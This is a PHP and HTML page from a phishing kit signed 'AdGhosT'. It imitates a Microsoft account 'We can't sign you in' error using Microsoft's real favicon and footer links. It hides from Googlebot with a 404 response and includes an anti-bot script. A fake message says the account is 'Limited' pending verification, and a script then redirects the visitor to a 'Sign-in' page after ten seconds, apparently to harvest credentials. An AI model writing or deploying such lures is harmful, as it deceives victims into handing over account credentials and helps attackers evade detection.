<?php

/*   
            .--,
           /  (
          /    \
         /      \ 
        /  0  0  \
((()   |    ()    |   ()))
\  ()  (  .____.  )  ()  /
 |` \_/ \  `""`  / \_/ `|
 |       `.'--'.`       |
  \        `""`        /
   \                  /
    `.  /-AdGhosT-/ .'    ,
     |`             |  _.'|
     |              `-'  /
     \                 .'
      `.____________.-'

 */

session_start();
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>

<?php ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>Something went wrong</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin>
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">

    <meta name="PageID" content="ConvergedDownLevelError" />
    <meta name="SiteID" content="" />
    <meta name="ReqLC" content="2057" />
    <meta name="LocLC" content="en-GB" />

    
        <link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />

<link rel="stylesheet" type="text/css" href="style/main.css">
</head>

<body>
    <div>
        <div class="outer">
            <div class="middle">
                <div class="inner relative">
                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAYCAYAAAAf1RgaAAAACXBIWXMAAAsSAAALEgHS3X78AAAD00lEQVRo3u1YTU7bUBD+XLFF8Q2S9gK4JyAs2i3puoskJ8BIs4/ZjxRzAozUrjHbdlHnBskBqpoTNOkF0s0MGgYbDC3CkTySF+/5/cx73/x884I/o3dbNJT9q59B8j1oPD75sA3QyX+VN90VdIB18oKy111Be4SIJgAG0iyYuWgFYEQ0ADAxXZXK1RwEzJxIfyb9yUPzdwCoEEAB4MD9KtriYQMAM9O+A0jFYVIAPctniCgCMNY2gOEOO1dswNoAWAJYy/lHAEJmztoUEvtENKzxkpEDS6UEcAOgDyDf8WhojS1i5lLAWsvZFwBaBZh6WVFjffeEmdd1XrnDslKwRHptJB3qJWMiigUIDYdDFyp6LlwmVTlQ5vkwmzNzKv/UojMxiAhAxsyZ5Ffts96cMvPSherYeUfOzKnL1YnTYylrlUYX/R+aM91JIdrfBsAyk89G6vrG6wBgJTH90M2d+QQtB5tV7HMouXDo9lODKCQvFhWWfSgGNdVcImuNK/ZJDVG6qNFjYsCyuvZrdL/tbwNghQDTF4vNjAWPzSVMGrCtkTvwSvJbCOCkYsqBeHgpYyxYN6KL6gYAKRGpJ6tu16LfSD1FPOuiQg9dq2fOfWb6b5zBzpwu2Nu/+vmk56MXem5KAcwBHBBRJKHHApQ3AczluyMXJtOK8WemRIgNWOfMHBtGGot+PQEGFSVJUaPHqQmTCRHlAI5lrZCZE/G2PoBS9RGdFLDb/r3g67rx2+D2cxjgW/O3RHxsDG4mF6JhMDaHvmTmNRE1WUdD5sIzTpfM74SvCqaWPKDfUHTT9lw8e2L2iMy+acWex6a82b2nKSEalwqYsTi4EPGUMNt0X5Wwpv/eOAHmVIiQGsqvCsKwqClHni1tekvMDJXVuurmmS8Y/1RES/6sa5fGcyJjaAAwk/wF72nu0WD3ARNgVq7+SJ9RIgDAoXipvfTokbn5AyHRtgsiGhBRyMwlM08ATJ2xqBf1JP/V5dllw3OFbarDfHy/qPC6xpzIzP9BRMquIskbwSOAJWIsJ5KXciEZfWMQueZYITJrQ0Q28n9pWORcQFPi1DNFct7AAPtCxrK2hUS9tI0lG0/00syFKK1fjhvMLQWIjZl7YsDaABgZnXqy9tyQnZSZ18Jyp06PE1cyjBreB0wZMX4twEqpP85sEpbLiKU/rchxOueWlstXmDUmAI4EuIV8lwA+GULi17GAR/JvYb5TAAPz0pG5MdcAppaSy1pvAZy7caf2vdCtlzl9YgDvzVnOA3z53QZa38kOssROOsA6wDp5ZQm22213CzskfwHfW6NSJlRQEQAAAABJRU5ErkJggg==" alt="Microsoft account symbol" />

                    <div class="row text-title" role="heading">We can&#39;t sign you in</div>

                        
                        <div class="row form-group">Hello Customer, your Account has Been Limited
                            Due to invalid activity, your account is paused, pending verification of your information, to activate your account, you will be directed automatically <br>Please Wait.
                        
                            <br><center><img src="https://c.top4top.io/p_1654rtxup1.gif" width="70%" </center>
                         </div>
                </div>
            </div>
        </div>

        <div class="footer default">
            <div id="footerLinks" class="footerNode text-secondary">
                    <div class="footerNode">
                        <span>
                        </span>
                        <a href="https://www.microsoft.com/en-GB/servicesagreement/" target="_blank">Terms of use</a>
                        <a href="https://privacy.microsoft.com/en-GB/privacystatement" target="_blank">Privacy &amp; cookies</a>
                    </div>
            </div>
        </div>
    </div>
  

    <script type="text/javascript">
        window.setTimeout("location=('Sign-in');", 10000);
    </script>

</body>
</html>